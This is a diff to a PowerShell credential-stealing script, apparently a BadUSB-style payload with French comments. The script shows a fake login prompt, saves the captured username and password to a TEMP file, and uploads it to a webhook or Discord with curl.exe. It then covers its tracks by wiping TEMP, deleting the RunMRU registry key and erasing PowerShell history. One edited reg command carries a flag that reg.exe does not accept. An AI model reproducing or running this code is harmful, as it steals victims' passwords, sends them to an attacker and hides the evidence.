@@ -91,7 +91,6 @@ if ($caps -eq $true){
 }
 
 Pause-Script
-
 Caps-Off
 
 Add-Type -AssemblyName PresentationCore,PresentationFramework
@@ -116,17 +115,9 @@ Write-Host "Password: $($creds.Password)" -ForegroundColor Yellow
 #----------------------------------------------------------------------------------------------------
 # SAUVEGARDE DANS TEMP
 
-Write-Host "DEBUG: Avant sauvegarde" -ForegroundColor Cyan
-Write-Host "DEBUG: filePath = $filePath" -ForegroundColor Cyan
-
-try {
-    $credString = "Username: $($creds.Username)`r`nPassword: $($creds.Password)"
-    $credString | Out-File -FilePath $filePath -Encoding UTF8 -Force -ErrorAction Stop
-    Write-Host "✓ Fichier créé avec succès: $filePath" -ForegroundColor Green
-}
-catch {
-    Write-Host "✗ ERREUR lors de la sauvegarde: $_" -ForegroundColor Red
-}
+$credString = "Username: $($creds.Username)`r`nPassword: $($creds.Password)"
+$credString | Out-File -FilePath $filePath -Encoding UTF8 -Force
+Write-Host "Fichier sauvegardé: $filePath" -ForegroundColor Green
 
 #----------------------------------------------------------------------------------------------------
 
@@ -160,13 +151,11 @@ if (-not ([string]::IsNullOrEmpty($file))){ curl.exe -F "file1=@$file" $hookurl 
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $filePath}
 
 #----------------------------------------------------------------------------------------------------
-# NETTOYAGE - SAUF LE FICHIER CREDENTIALS.TXT
+# NETTOYAGE - SANS SUPPRIMER credentials.txt
 
-$filesToKeep = @("credentials.txt")
+Get-ChildItem $env:TEMP -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -ne "credentials.txt" } | Remove-Item -Force -ErrorAction SilentlyContinue -Recurse
 
-Get-ChildItem $env:TEMP -Force -ErrorAction SilentlyContinue | Where-Object { $filesToKeep -notcontains $_.Name } | Remove-Item -Force -ErrorAction SilentlyContinue -Recurse
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f -ErrorAction SilentlyContinue
 
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
